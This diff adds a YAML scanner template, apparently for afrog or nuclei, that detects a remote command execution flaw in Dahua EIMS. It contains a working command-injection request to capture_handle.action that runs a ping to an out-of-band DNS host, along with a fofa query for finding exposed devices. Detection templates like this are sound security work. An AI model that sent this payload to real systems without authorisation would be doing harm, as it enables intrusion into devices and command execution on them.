@@ -1,0 +1,25 @@
+id: dahua-eims-capture-handle-rce
+
+info:
+  name: Dahua EIMS capture_handle Remote Command Execution
+  author: Co5mos
+  severity: critical
+  verified: true
+  description: |-
+    Dahua EIMS capture_handle interface allows remote command execution.
+    fofa: app="dahua-EIMS"
+  reference:
+    - https://cn-sec.com/archives/2554372.html
+  tags: dahua,rce
+  created: 2024/03/14
+
+set:
+  oob: oob()
+  oobDNS: oob.DNS
+rules:
+  r0:
+    request:
+      method: GET
+      path: /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20{{oobDNS}}%20index.pcap
+    expression: oobCheck(oob, oob.ProtocolDNS, 3)
+expression: r0()
